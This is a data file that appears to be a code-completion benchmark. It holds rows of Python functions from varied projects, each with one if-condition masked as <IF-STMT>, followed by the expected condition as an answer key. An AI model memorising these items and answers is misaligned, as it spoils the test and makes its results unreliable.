3695,"def add_system_info_creds_to_config(creds):<tab>for user in creds:<tab><tab>ConfigService.creds_add_username(creds[user][""username""])<tab><tab>if ""password"" in creds[user] and creds[user][""password""]:<tab><tab><tab>ConfigService.creds_add_password(creds[user][""password""])<tab><tab><IF-STMT><tab><tab><tab>ConfigService.creds_add_lm_hash(creds[user][""lm_hash""])<tab><tab>if ""ntlm_hash"" in creds[user] and creds[user][""ntlm_hash""]:<tab><tab><tab>ConfigService.creds_add_ntlm_hash(creds[user][""ntlm_hash""])","if ""lm_hash"" in creds [ user ] and creds [ user ] [ ""lm_hash"" ] :",175
3696,"def line_number(self):<tab>if self._line_range:<tab><tab>line_range = self._line_range<tab><tab><IF-STMT><tab><tab><tab>return ""%03d-%03d"" % (line_range.start, line_range.stop - 1)<tab><tab>else:<tab><tab><tab>return ""%03d"" % line_range.start",if line_range . stop - line_range . start > 1 :,95
3697,"def smooth(self, y, x=None, weights=None):<tab>if self.method == ""target_df"":<tab><tab><IF-STMT><tab><tab><tab>self.fit(y, x=x, weights=weights, pen=self.pen)<tab><tab>else:<tab><tab><tab>self.fit_target_df(y, x=x, weights=weights, df=self.target_df)<tab>elif self.method == ""optimize_gcv"":<tab><tab>self.fit_optimize_gcv(y, x=x, weights=weights)","if hasattr ( self , ""pen"" ) :",133
3698,"def dict_from_cursor(data=None, keys=None):<tab>filtered_dict = {}<tab># Convert Uids to str<tab>data = bson_dumps(data)<tab>python_dict = json.loads(data)<tab>for key in keys:<tab><tab>value = python_dict.get(key)<tab><tab>if type(value) is dict:<tab><tab><tab># Try to get mongo_id<tab><tab><tab>mongo_id = value.get(""$oid"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>value = mongo_id<tab><tab>if key == ""_id"":<tab><tab><tab>key = ""id""<tab><tab>filtered_dict[key] = value<tab>return filtered_dict",if mongo_id :,170
3699,"def pytest_plugin_registered(self, plugin):<tab>nodeid = None<tab>try:<tab><tab>p = py.path.local(plugin.__file__)<tab>except AttributeError:<tab><tab>pass<tab>else:<tab><tab># construct the base nodeid which is later used to check<tab><tab># what fixtures are visible for particular tests (as denoted<tab><tab># by their test id)<tab><tab>if p.basename.startswith(""conftest.py""):<tab><tab><tab>nodeid = p.dirpath().relto(self.config.rootdir)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>nodeid = nodeid.replace(p.sep, ""/"")<tab>self.parsefactories(plugin, nodeid)","if p . sep != ""/"" :",161
3700,"def _escape_unsafe_values(self, *values):<tab># type: (str) -> Generator[str]<tab>""""""Escape unsafe values (name, section name) for API version 2.10 and below""""""<tab>for value in values:<tab><tab><IF-STMT><tab><tab><tab>yield value<tab><tab>else:<tab><tab><tab>self.task.log.info(<tab><tab><tab><tab>""Converting unsafe hyper parameter name/section '{}' to '{}'"".format(<tab><tab><tab><tab><tab>value, ""_"" + value<tab><tab><tab><tab>)<tab><tab><tab>)<tab><tab><tab>yield ""_"" + value",if value not in UNSAFE_NAMES_2_10 :,143
3701,"def _identifier_split(self, identifier):<tab>""""""Return (name, start, end) string tuple from an identifier (PRIVATE).""""""<tab>if ""/"" in identifier:<tab><tab>name, start_end = identifier.rsplit(""/"", 1)<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>start, end = start_end.split(""-"")<tab><tab><tab><tab>return name, int(start), int(end)<tab><tab><tab>except ValueError:<tab><tab><tab><tab># Non-integers after final '/' - fall through<tab><tab><tab><tab>pass<tab>return identifier, None, None","if start_end . count ( ""-"" ) == 1 :",138
3702,"def _complete_initial_layout(self):<tab>""""""Finish initial layout; called after toplevel win is positioned""""""<tab># Init tool group sizes by setting vpaned positions<tab>for paned in self._get_paneds():<tab><tab><IF-STMT><tab><tab><tab>pos = paned._initial_divider_position<tab><tab><tab>GLib.idle_add(paned.set_position, pos)",if paned . _initial_divider_position :,101
3703,"def _init_mapping(self, result):<tab>for wamp_uri, full_name in result.items():<tab><tab>for prefix in self.PREFIXES:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>short_name = full_name[len(prefix) :]<tab><tab><tab>self._mapping[short_name] = wamp_uri",if not full_name . startswith ( prefix ) :,92
3704,"def get_bounce_message(reason, ses_data, details):<tab>if reason != ""bounce"":<tab><tab>return<tab>if ses_data:<tab><tab>bouncedRecipients = ses_data.get(""bounce"", {}).get(""bouncedRecipients"")<tab><tab><IF-STMT><tab><tab><tab>recipient = bouncedRecipients[0]<tab><tab><tab>return recipient.get(""diagnosticCode"") or recipient.get(""status"")<tab>elif details:<tab><tab>return details",if bouncedRecipients :,124
3705,"def do_If(self, node, elif_flag=False):<tab>self.div(""statement"")<tab>self.keyword(""elif"" if elif_flag else ""if"")<tab>self.visit(node.test)<tab>self.colon()<tab>self.div_body(node.body)<tab>if node.orelse:<tab><tab>node1 = node.orelse[0]<tab><tab><IF-STMT><tab><tab><tab>self.do_If(node1, elif_flag=True)<tab><tab>else:<tab><tab><tab>self.keyword(""else"")<tab><tab><tab>self.colon()<tab><tab><tab>self.div_body(node.orelse)<tab>self.end_div(""statement"")","if isinstance ( node1 , ast . If ) and len ( node . orelse ) == 1 :",176
3706,"def matches(self, filepath):<tab>matched = False<tab>parent_path = os.path.dirname(filepath)<tab>parent_path_dirs = split_path(parent_path)<tab>for pattern in self.patterns:<tab><tab>negative = pattern.exclusion<tab><tab>match = pattern.match(filepath)<tab><tab>if not match and parent_path != """":<tab><tab><tab>if len(pattern.dirs) <= len(parent_path_dirs):<tab><tab><tab><tab>match = pattern.match(<tab><tab><tab><tab><tab>os.path.sep.join(parent_path_dirs[: len(pattern.dirs)])<tab><tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>matched = not negative<tab>return matched",if match :,165
3707,"def test_11_wait_for_first_reboot_with_bhyve():<tab>if update_version is None:<tab><tab>pytest.skip(""No update found"")<tab>elif download_failed is True:<tab><tab>pytest.skip(f""Downloading {selected_trains} failed"")<tab>elif reboot is False:<tab><tab>pytest.skip(""Reboot is False skip"")<tab>else:<tab><tab><IF-STMT><tab><tab><tab>pytest.skip(""skip no vm_name"")<tab><tab>else:<tab><tab><tab>while vm_state(vm_name) != ""stopped"":<tab><tab><tab><tab>sleep(5)<tab><tab><tab>assert vm_start(vm_name) is True<tab>sleep(1)",if vm_name is None :,167
3708,def _check_network_private(test_network):<tab>test_net = ipaddress.IPNetwork(test_network)<tab>test_start = test_net.network<tab>test_end = test_net.broadcast<tab>for network in settings.vpn.safe_priv_subnets:<tab><tab>network = ipaddress.IPNetwork(network)<tab><tab>net_start = network.network<tab><tab>net_end = network.broadcast<tab><tab><IF-STMT><tab><tab><tab>return True<tab>return False,if test_start >= net_start and test_end <= net_end :,129
3709,def remove_stale_sockets(self):<tab>with self.lock:<tab><tab>if self.opts.max_idle_time_ms is not None:<tab><tab><tab>for sock_info in self.sockets.copy():<tab><tab><tab><tab>age = _time() - sock_info.last_checkout<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self.sockets.remove(sock_info)<tab><tab><tab><tab><tab>sock_info.close()<tab>while len(self.sockets) + self.active_sockets < self.opts.min_pool_size:<tab><tab>sock_info = self.connect()<tab><tab>with self.lock:<tab><tab><tab>self.sockets.add(sock_info),if age > self . opts . max_idle_time_ms :,176
3710,"def hint(self, button):<tab>""""""As hilight, but marks GTK Button as well""""""<tab>active = None<tab>for b in self.button_widgets.values():<tab><tab>if b.widget.get_sensitive():<tab><tab><tab>b.widget.set_state(Gtk.StateType.NORMAL)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>active = b.widget<tab>if active is not None:<tab><tab>active.set_state(Gtk.StateType.ACTIVE)<tab>self.hilight(button)",if b . name == button :,126
3711,"def post_process(self, retcode):<tab>if not self.ok_codes:<tab><tab>return retcode<tab>for code in self.ok_codes:<tab><tab>self.log.debug(""Comparing %s with %s codes"", code, retcode)<tab><tab><IF-STMT><tab><tab><tab>self.log.info(""Exit code %s was changed to 0 by RCAssert plugin"", code)<tab><tab><tab>return 0<tab>self.log.info(<tab><tab>""Changing exit code to %s because RCAssert pass list was unsatisfied"",<tab><tab>self.fail_code,<tab>)<tab>return self.fail_code",if code == int ( retcode ) :,149
3712,"def get_form_kwargs(self):<tab>result = super().get_form_kwargs()<tab>if self.request.method != ""POST"":<tab><tab>if self.initial:<tab><tab><tab># When going from other form (for example ZIP import)<tab><tab><tab>result.pop(""data"", None)<tab><tab><tab>result.pop(""files"", None)<tab><tab><IF-STMT><tab><tab><tab>result[""data""] = self.request.GET<tab>return result",if self . has_all_fields ( ) and not self . empty_form :,120
3713,"def transform_first_chunk(self, headers, chunk, finishing):<tab>if self._chunking:<tab><tab># No need to chunk the output if a Content-Length is specified<tab><tab><IF-STMT><tab><tab><tab>self._chunking = False<tab><tab>else:<tab><tab><tab>headers[""Transfer-Encoding""] = ""chunked""<tab><tab><tab>chunk = self.transform_chunk(chunk, finishing)<tab>return headers, chunk","if ""Content-Length"" in headers or ""Transfer-Encoding"" in headers :",112
3714,"def copy_stream(self, in_fd, out_fd, length=2 ** 64):<tab>total = 0<tab>while 1:<tab><tab>available_to_read = min(length - total, self.BUFFERSIZE)<tab><tab>data = in_fd.read(available_to_read)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>out_fd.write(data)<tab><tab>total += len(data)<tab><tab>self.session.report_progress(""Reading %s @ %#x"", in_fd.urn, total)",if not data :,128
3715,"def _trim_steps(self, num_steps):<tab>""""""Trims a given number of steps from the end of the sequence.""""""<tab>steps_trimmed = 0<tab>for i in reversed(range(len(self._events))):<tab><tab><IF-STMT><tab><tab><tab>if steps_trimmed == num_steps:<tab><tab><tab><tab>del self._events[i + 1 :]<tab><tab><tab><tab>break<tab><tab><tab>steps_trimmed += 1<tab><tab>elif i == 0:<tab><tab><tab>self._events = [<tab><tab><tab><tab>PolyphonicEvent(event_type=PolyphonicEvent.START, pitch=None)<tab><tab><tab>]<tab><tab><tab>break",if self . _events [ i ] . event_type == PolyphonicEvent . STEP_END :,171
3716,"def get_img_file(dir_name: str) -> list:<tab>""""""Get all image file paths in several directories which have the same parent directory.""""""<tab>images = []<tab>for parent, _, filenames in os.walk(dir_name):<tab><tab>for filename in filenames:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>img_path = os.path.join(parent, filename)<tab><tab><tab>images.append(img_path)<tab>return images",if not is_image_file ( filename ) :,118
3717,"def get_agg_title(clause):<tab>attr = str(clause.attribute)<tab>if clause.aggregation is None:<tab><tab><IF-STMT><tab><tab><tab>return attr[:15] + ""..."" + attr[-10:]<tab><tab>return f""{attr}""<tab>elif attr == ""Record"":<tab><tab>return f""Number of Records""<tab>else:<tab><tab>if len(attr) > 15:<tab><tab><tab>return f""{clause._aggregation_name.capitalize()} of {attr[:15]}...""<tab><tab>return f""{clause._aggregation_name.capitalize()} of {attr}""",if len ( attr ) > 25 :,137
3718,"def _check_realign(data):<tab>""""""Check for realignment, which is not supported in GATK4""""""<tab>if ""gatk4"" not in data[""algorithm""].get(""tools_off"", []) and not ""gatk4"" == data[<tab><tab>""algorithm""<tab>].get(""tools_off""):<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""In sample %s, realign specified but it is not supported for GATK4. ""<tab><tab><tab><tab>""Realignment is generally not necessary for most variant callers.""<tab><tab><tab><tab>% (dd.get_sample_name(data))<tab><tab><tab>)","if data [ ""algorithm"" ] . get ( ""realign"" ) :",160
3719,"def __call__(self, target):<tab>if ""weights"" not in target.temp:<tab><tab>return True<tab>targets = target.temp[""weights""]<tab>for cname in target.children:<tab><tab>if cname in targets:<tab><tab><tab>c = target.children[cname]<tab><tab><tab>deviation = abs((c.weight - targets[cname]) / targets[cname])<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True<tab>if ""cash"" in target.temp:<tab><tab>cash_deviation = abs(<tab><tab><tab>(target.capital - targets.value) / targets.value - target.temp[""cash""]<tab><tab>)<tab><tab>if cash_deviation > self.tolerance:<tab><tab><tab>return True<tab>return False",if deviation > self . tolerance :,178
3720,"def status_string(self):<tab>if not self.live:<tab><tab><IF-STMT><tab><tab><tab>return _(""expired"")<tab><tab>elif self.approved_schedule:<tab><tab><tab>return _(""scheduled"")<tab><tab>elif self.workflow_in_progress:<tab><tab><tab>return _(""in moderation"")<tab><tab>else:<tab><tab><tab>return _(""draft"")<tab>else:<tab><tab>if self.approved_schedule:<tab><tab><tab>return _(""live + scheduled"")<tab><tab>elif self.workflow_in_progress:<tab><tab><tab>return _(""live + in moderation"")<tab><tab>elif self.has_unpublished_changes:<tab><tab><tab>return _(""live + draft"")<tab><tab>else:<tab><tab><tab>return _(""live"")",if self . expired :,166
3721,"def __getitem__(self, item):<tab>if item == ""EntityId"":<tab><tab><IF-STMT><tab><tab><tab>if self.use_uuid:<tab><tab><tab><tab>super(PlayerDict, self).__setitem__(<tab><tab><tab><tab><tab>""EntityId"", self.get_name_from_uuid()<tab><tab><tab><tab>)<tab><tab><tab>else:<tab><tab><tab><tab>super(PlayerDict, self).__setitem__(""EntityId"", self._name)<tab>return super(PlayerDict, self).__getitem__(item)","if ""EntityId"" not in self :",122
3722,"def _to_num_bytes(java_mem_str):<tab>if isinstance(java_mem_str, string_types):<tab><tab>for i, magnitude in enumerate((""k"", ""m"", ""g"", ""t""), start=1):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return int(java_mem_str[:-1]) * 1024 ** i<tab>return int(java_mem_str)",if java_mem_str . lower ( ) . endswith ( magnitude ) :,103
3723,"def test_layout_instantiate_subplots(self):<tab>layout = (<tab><tab>Curve(range(10))<tab><tab>+ Curve(range(10))<tab><tab>+ Image(np.random.rand(10, 10))<tab><tab>+ Curve(range(10))<tab><tab>+ Curve(range(10))<tab>)<tab>plot = mpl_renderer.get_plot(layout)<tab>positions = [(0, 0), (0, 1), (0, 2), (0, 3), (1, 0)]<tab>self.assertEqual(sorted(plot.subplots.keys()), positions)<tab>for i, pos in enumerate(positions):<tab><tab>adjoint = plot.subplots[pos]<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(adjoint.subplots[""main""].layout_num, i + 1)","if ""main"" in adjoint . subplots :",194
3724,"def __str__(self):<tab>width = int(os.environ.get(""COLUMNS"", ""80""))<tab>s = (<tab><tab>self.getSynopsis()<tab><tab>+ ""\n""<tab><tab>+ ""(use 'tahoe --help' to view global options)\n""<tab><tab>+ ""\n""<tab><tab>+ self.getUsage()<tab>)<tab>if self.description:<tab><tab>s += ""\n"" + wrap_paragraphs(self.description, width) + ""\n""<tab>if self.description_unwrapped:<tab><tab>du = textwrap.dedent(self.description_unwrapped)<tab><tab><IF-STMT><tab><tab><tab>du = du[1:]<tab><tab>s += ""\n"" + du + ""\n""<tab>return s","if du . startswith ( ""\n"" ) :",181
3725,"def open(self, path, mode=""rb"", cryptoType=-1, cryptoKey=-1, cryptoCounter=-1):<tab>if path is not None:<tab><tab><IF-STMT><tab><tab><tab>self.close()<tab><tab>if isinstance(path, str):<tab><tab><tab>self.f = open(path, mode)<tab><tab><tab>self._path = path<tab><tab><tab>self.f.seek(0, 2)<tab><tab><tab>self.size = self.f.tell()<tab><tab><tab>self.f.seek(0, 0)<tab><tab>elif isinstance(path, BaseFile):<tab><tab><tab>self.f = path<tab><tab><tab>self.size = path.size<tab><tab>else:<tab><tab><tab>raise IOError(""Invalid file parameter"")<tab>self.setupCrypto(cryptoType, cryptoKey, cryptoCounter)",if self . isOpen ( ) :,189
3726,"def open_spotify():<tab>if sys.platform == ""win32"":<tab><tab><IF-STMT><tab><tab><tab>path = os.getenv(""APPDATA"") + ""\Spotify\Spotify.exe""<tab><tab><tab>subprocess.Popen(path)<tab><tab>else:<tab><tab><tab>pass<tab>elif sys.platform == ""linux"":<tab><tab>if getwindowtitle() == """":<tab><tab><tab>subprocess.Popen(""spotify"")<tab><tab>else:<tab><tab><tab>pass<tab>elif sys.platform == ""darwin"":<tab><tab># I don't have a mac so I don't know if this actually works<tab><tab># If it does, please let me know, if it doesn't please fix it :)<tab><tab>if getwindowtitle() == """":<tab><tab><tab>subprocess.Popen(""open -a Spotify"")<tab><tab>else:<tab><tab><tab>pass<tab>else:<tab><tab>pass","if getwindowtitle ( ) == """" :",198
3727,def get_search_columns_list(self) -> List[str]:<tab>ret_lst = list()<tab>for col_name in self.get_columns_list():<tab><tab><IF-STMT><tab><tab><tab>tmp_prop = self.get_property_first_col(col_name).name<tab><tab><tab>if (<tab><tab><tab><tab>(not self.is_pk(tmp_prop))<tab><tab><tab><tab>and (not self.is_fk(tmp_prop))<tab><tab><tab><tab>and (not self.is_image(col_name))<tab><tab><tab><tab>and (not self.is_file(col_name))<tab><tab><tab>):<tab><tab><tab><tab>ret_lst.append(col_name)<tab><tab>else:<tab><tab><tab>ret_lst.append(col_name)<tab>return ret_lst,if not self . is_relation ( col_name ) :,200
3728,"def get_artist(self, name):<tab>artist = self.artists.get(name)<tab>if not artist:<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>artist = q(m.Artist).filter_by(name=name).one()<tab><tab><tab>except NoResultFound:<tab><tab><tab><tab>pass<tab><tab><tab>if artist and self.ram_cache:<tab><tab><tab><tab>self.add_artist(artist)<tab>return artist",if self . use_db :,111
3729,"def _find_glob_metadata(cur_files, metadata):<tab>md_key = None<tab>for check_key in metadata.keys():<tab><tab>matches = 0<tab><tab><IF-STMT><tab><tab><tab>for fname in cur_files:<tab><tab><tab><tab>if fnmatch.fnmatch(fname, ""*/%s"" % check_key):<tab><tab><tab><tab><tab>matches += 1<tab><tab>if matches == len(cur_files):<tab><tab><tab>md_key = check_key<tab><tab><tab>break<tab>if md_key:<tab><tab>return metadata[md_key]","if ""*"" in check_key :",135
3730,"def extract_copy(<tab>data: bytearray, mem: bytearray, memstart: int, datastart: int, size: int):<tab>for i in range(size):<tab><tab><IF-STMT><tab><tab><tab>mem[memstart + i] = data[datastart + i]<tab><tab>else:<tab><tab><tab>mem[memstart + i] = 0",if datastart + i < len ( data ) :,89
3731,"def rpc_get_image(self, sender, image_hash):<tab>self.router.addContact(sender)<tab>try:<tab><tab><IF-STMT><tab><tab><tab>self.log.warning(""Image hash is not 20 characters %s"" % image_hash)<tab><tab><tab>raise Exception(""Invalid image hash"")<tab><tab>self.log.info(""serving image %s to %s"" % (image_hash.encode(""hex""), sender))<tab><tab>with open(self.db.filemap.get_file(image_hash.encode(""hex"")), ""rb"") as filename:<tab><tab><tab>image = filename.read()<tab><tab>return [image]<tab>except Exception:<tab><tab>self.log.warning(""could not find image %s"" % image_hash[:20].encode(""hex""))<tab><tab>return None",if len ( image_hash ) != 20 :,195
3732,"def preprocess_mnist(raw, withlabel, ndim, scale, image_dtype, label_dtype, rgb_format):<tab>images = raw[""x""]<tab>if ndim == 2:<tab><tab>images = images.reshape(-1, 28, 28)<tab>elif ndim == 3:<tab><tab>images = images.reshape(-1, 1, 28, 28)<tab><tab><IF-STMT><tab><tab><tab>images = np.broadcast_to(images, (len(images), 3) + images.shape[2:])<tab>elif ndim != 1:<tab><tab>raise ValueError(""invalid ndim for MNIST dataset"")<tab>images = images.astype(image_dtype)<tab>images *= scale / 255.0<tab>if withlabel:<tab><tab>labels = raw[""y""].astype(label_dtype)<tab><tab>return images, labels<tab>return images",if rgb_format :,189
3733,"def get_tokens_unprocessed(self, text):<tab>for index, token, value in RegexLexer.get_tokens_unprocessed(self, text):<tab><tab>if token is Name:<tab><tab><tab>if self.stdlibhighlighting and value in self.stdlib_types:<tab><tab><tab><tab>token = Keyword.Type<tab><tab><tab>elif self.c99highlighting and value in self.c99_types:<tab><tab><tab><tab>token = Keyword.Type<tab><tab><tab><IF-STMT><tab><tab><tab><tab>token = Keyword.Type<tab><tab>yield index, token, value",elif self . platformhighlighting and value in self . linux_types :,141
3734,"def _match(self, pattern, input_string, context=None):<tab>for index in find_all(input_string, pattern, **self._kwargs):<tab><tab>match = Match(<tab><tab><tab>index,<tab><tab><tab>index + len(pattern),<tab><tab><tab>pattern=self,<tab><tab><tab>input_string=input_string,<tab><tab><tab>**self._match_kwargs<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>yield match",if match :,106
3735,"def https_open(self, req):<tab>try:<tab><tab>return self.do_open(do_connection, req)<tab>except Exception as err_msg:<tab><tab>try:<tab><tab><tab>error_msg = str(err_msg.args[0]).split(""] "")[1] + "".""<tab><tab>except IndexError:<tab><tab><tab>error_msg = str(err_msg.args[0]) + "".""<tab><tab>if settings.INIT_TEST == True:<tab><tab><tab>if settings.VERBOSITY_LEVEL < 2:<tab><tab><tab><tab>print(settings.FAIL_STATUS)<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print("""")<tab><tab>print(settings.print_critical_msg(error_msg))<tab><tab>raise SystemExit()",if settings . VERBOSITY_LEVEL < 1 :,187
3736,"def recursive_select(tag):<tab><IF-STMT><tab><tab>print(<tab><tab><tab>'<tab>Calling select(""%s"") recursively on %s %s'<tab><tab><tab>% (next_token, tag.name, tag.attrs)<tab><tab>)<tab><tab>print(""-"" * 40)<tab>for i in tag.select(next_token, recursive_candidate_generator):<tab><tab>if self._select_debug:<tab><tab><tab>print(""(Recursive select picked up candidate %s %s)"" % (i.name, i.attrs))<tab><tab>yield i<tab>if self._select_debug:<tab><tab>print(""-"" * 40)",if self . _select_debug :,150
3737,"def detect(self, agent, result):<tab># -> True/None<tab>word = self.checkWords(agent)<tab>if word:<tab><tab>result[self.info_type] = dict(name=self.name)<tab><tab>result[""bot""] = self.bot<tab><tab>version = self.getVersion(agent, word)<tab><tab>if version:<tab><tab><tab>result[self.info_type][""version""] = version<tab><tab><IF-STMT><tab><tab><tab>result[""platform""] = {""name"": self.platform, ""version"": version}<tab><tab>return True",if self . platform :,134
3738,"def is_display_marc(data):<tab>if data.startswith(<tab><tab>""(Length implementation at offset 22 should hold a digit. Assuming 0)""<tab>):<tab><tab>return True<tab>try:<tab><tab>lines = data.split(""\n"")<tab><tab>leader = lines[0]<tab><tab>assert re_leader.match(leader)<tab><tab>for line in lines[1:]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>assert re_control.match(line)<tab><tab><tab>else:<tab><tab><tab><tab>assert re_data.match(line)<tab><tab>return True<tab>except AssertionError:<tab><tab>return False","if line . startswith ( ""00"" ) :",152
3739,"def nodejslib(self):<tab>if not hasattr(self, ""_nodejslib""):<tab><tab>for lib in self.libs:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._nodejslib = lib<tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>self._nodejslib = None<tab>return self._nodejslib","if lib . name == ""node.js stdlib"" :",88
3740,"def get(self, key, default=None, type=None):<tab>for d in self.dicts:<tab><tab><IF-STMT><tab><tab><tab>if type is not None:<tab><tab><tab><tab>try:<tab><tab><tab><tab><tab>return type(d[key])<tab><tab><tab><tab>except ValueError:<tab><tab><tab><tab><tab>continue<tab><tab><tab>return d[key]<tab>return default",if key in d :,91
3741,"def add_callers(target, source):<tab>""""""Combine two caller lists in a single list.""""""<tab>new_callers = {}<tab>for func, caller in target.items():<tab><tab>new_callers[func] = caller<tab>for func, caller in source.items():<tab><tab>if func in new_callers:<tab><tab><tab><IF-STMT><tab><tab><tab><tab># format used by cProfile<tab><tab><tab><tab>new_callers[func] = tuple(<tab><tab><tab><tab><tab>[i[0] + i[1] for i in zip(caller, new_callers[func])]<tab><tab><tab><tab>)<tab><tab><tab>else:<tab><tab><tab><tab># format used by profile<tab><tab><tab><tab>new_callers[func] += caller<tab><tab>else:<tab><tab><tab>new_callers[func] = caller<tab>return new_callers","if isinstance ( caller , tuple ) :",195
3742,"def work(src, vsi_dest):<tab>gdal.Mkdir(vsi_dest, 0o777)<tab>for item in src.iterdir():<tab><tab>item_vsi_dest = os.path.join(vsi_dest, item.name)<tab><tab><IF-STMT><tab><tab><tab>work(item, item_vsi_dest)<tab><tab>else:<tab><tab><tab>VsiFileSystem.copy_to(str(item), item_vsi_dest)",if item . is_dir ( ) :,115
3743,"def __getitem__(self, key):<tab>if isinstance(key, raw_types.Qid):<tab><tab>return self._operation_touching(key)<tab>elif isinstance(key, Iterable):<tab><tab>qubits_to_keep = frozenset(key)<tab><tab>ops_to_keep = tuple(<tab><tab><tab>op<tab><tab><tab>for op in self.operations<tab><tab><tab><IF-STMT><tab><tab>)<tab><tab>return Moment(ops_to_keep)",if not qubits_to_keep . isdisjoint ( frozenset ( op . qubits ) ),124
3744,"def mlt_version_is_greater_correct(test_version):<tab>runtime_ver = mlt_version.split(""."")<tab>test_ver = test_version.split(""."")<tab>if runtime_ver[0] > test_ver[0]:<tab><tab>return True<tab>elif runtime_ver[0] == test_ver[0]:<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>elif runtime_ver[1] == test_ver[1]:<tab><tab><tab>if runtime_ver[2] > test_ver[2]:<tab><tab><tab><tab>return True<tab>return False",if runtime_ver [ 1 ] > test_ver [ 1 ] :,148
3745,"def populate(self, item):<tab>path = self.getItemPath(item)<tab>for name in sorted(os.listdir(path)):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>pathname = os.path.join(path, name)<tab><tab>if os.path.isdir(pathname):<tab><tab><tab>item.addChild(name, True)<tab><tab>elif name.lower().endswith("".target"") and os.path.isfile(pathname):<tab><tab><tab>item.addChild(name, False)","if name [ 0 ] == ""."" :",122
3746,"def runTests(self):<tab>""""""Run tests""""""<tab># fire plugin hook<tab>runner = self._makeRunner()<tab>try:<tab><tab>self.result = runner.run(self.test)<tab>except Exception as e:<tab><tab>log.exception(""Internal Error"")<tab><tab>sys.stderr.write(""Internal Error: runTests aborted: %s\n"" % (e))<tab><tab><IF-STMT><tab><tab><tab>sys.exit(1)<tab>if self.exit:<tab><tab>sys.exit(not self.result.wasSuccessful())",if self . exit :,129
3747,"def __setitem__(self, key, value):<tab>""""""Like :meth:`set` but also supports index/slice based setting.""""""<tab>if isinstance(key, (slice, int)):<tab><tab><IF-STMT><tab><tab><tab>value = [value]<tab><tab>value = [<tab><tab><tab>(_unicodify_header_value(k), _unicodify_header_value(v)) for (k, v) in value<tab><tab>]<tab><tab>for (_, v) in value:<tab><tab><tab>self._validate_value(v)<tab><tab>if isinstance(key, int):<tab><tab><tab>self._list[key] = value[0]<tab><tab>else:<tab><tab><tab>self._list[key] = value<tab>else:<tab><tab>self.set(key, value)","if isinstance ( key , int ) :",181
3748,"def toggle_fullscreen_hide_tabbar(self):<tab>if self.is_fullscreen():<tab><tab><IF-STMT><tab><tab><tab>if self.guake and self.guake.notebook_manager:<tab><tab><tab><tab>self.guake.notebook_manager.set_notebooks_tabbar_visible(False)<tab>else:<tab><tab>if self.guake and self.guake.notebook_manager:<tab><tab><tab>v = self.settings.general.get_boolean(""window-tabbar"")<tab><tab><tab>self.guake.notebook_manager.set_notebooks_tabbar_visible(v)","if self . settings . general . get_boolean ( ""fullscreen-hide-tabbar"" ) :",159
3749,"def clear_doc(self, docname: str) -> None:<tab>for sChild in self._children:<tab><tab>sChild.clear_doc(docname)<tab><tab><IF-STMT><tab><tab><tab>sChild.declaration = None<tab><tab><tab>sChild.docname = None<tab><tab><tab>sChild.line = None<tab><tab><tab>if sChild.siblingAbove is not None:<tab><tab><tab><tab>sChild.siblingAbove.siblingBelow = sChild.siblingBelow<tab><tab><tab>if sChild.siblingBelow is not None:<tab><tab><tab><tab>sChild.siblingBelow.siblingAbove = sChild.siblingAbove<tab><tab><tab>sChild.siblingAbove = None<tab><tab><tab>sChild.siblingBelow = None",if sChild . declaration and sChild . docname == docname :,189
3750,"def visit_hierarchichttprequest(self, request):<tab>files = []<tab>body_file = request.config.get(""body-file"")<tab>if body_file:<tab><tab>files.append(body_file)<tab>uploads = request.config.get(""upload-files"", [])<tab>files.extend([x[""path""] for x in uploads if not has_variable_pattern(x[""path""])])<tab>if ""jsr223"" in request.config:<tab><tab>jsrs = request.config.get(""jsr223"")<tab><tab><IF-STMT><tab><tab><tab>jsrs = [jsrs]<tab><tab>for jsr in jsrs:<tab><tab><tab>if ""script-file"" in jsr:<tab><tab><tab><tab>files.append(jsr.get(""script-file""))<tab>return files","if isinstance ( jsrs , dict ) :",192
3751,"def find_commands(management_dir):<tab># Modified version of function from django/core/management/__init__.py.<tab>command_dir = os.path.join(management_dir, ""commands"")<tab>commands = []<tab>try:<tab><tab>for f in os.listdir(command_dir):<tab><tab><tab>if f.startswith(""_""):<tab><tab><tab><tab>continue<tab><tab><tab>elif f.endswith("".py"") and f[:-3] not in commands:<tab><tab><tab><tab>commands.append(f[:-3])<tab><tab><tab><IF-STMT><tab><tab><tab><tab>commands.append(f[:-4])<tab>except OSError:<tab><tab>pass<tab>return commands","elif f . endswith ( "".pyc"" ) and f [ : - 4 ] not in commands :",164
3752,"def show_panel(panel_id):<tab># Iterate positions to find where panel is and bring it to front.<tab>for position in _positions_names:<tab><tab>pos_panel_ids = _get_position_panels(position)<tab><tab>if len(pos_panel_ids) == 0:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>panel_widget = _get_panels_widgets_dict(gui.editor_window)[panel_id]<tab><tab>notebook = _position_notebooks[position]<tab><tab>for i in range(0, notebook.get_n_pages()):<tab><tab><tab>notebook_page = notebook.get_nth_page(i)<tab><tab><tab>if notebook_page == panel_widget:<tab><tab><tab><tab>notebook.set_current_page(i)",if len ( pos_panel_ids ) == 1 :,197
